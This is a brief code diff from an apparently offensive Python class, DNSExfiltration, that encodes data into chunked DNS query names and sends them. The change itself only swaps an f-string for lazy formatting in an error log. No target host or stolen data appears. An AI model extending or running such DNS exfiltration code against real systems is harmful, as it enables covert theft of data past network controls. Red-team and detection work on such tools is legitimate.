@@ -121,7 +121,7 @@ class DNSExfiltration(BaseExfiltration):
             for seq, chunk in self._split_encoded(encoded):
                 query_name = self._build_query_name(chunk, seq)
                 if len(query_name) > self.MAX_NAME_LENGTH:
-                    self.logger.error(f"Query name too long: {len(query_name)}")
+                    self.logger.error("Query name too long: %s", len(query_name))
                     return False
 
                 self._send_query(query_name)
